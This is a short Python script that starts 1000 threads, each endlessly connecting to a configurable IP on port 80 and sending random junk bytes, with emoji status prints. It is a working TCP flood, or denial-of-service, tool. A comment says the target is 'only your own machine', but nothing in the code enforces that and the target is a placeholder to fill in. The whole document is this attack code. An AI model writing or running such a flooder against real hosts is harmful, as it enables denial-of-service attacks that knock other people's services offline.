import socket, threading, random

target_ip = "your.panel.ip"  # ✅ Only your own machine
target_port = 80
threads = 1000

def attack(tid):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(random._urandom(1024))  # Raw junk
            s.close()
            print(f"[T{tid}] 🚀 Sent")
        except:
            print(f"[T{tid}] ❌ Fail")

for i in range(threads):
    threading.Thread(target=attack, args=(i,)).start()
  
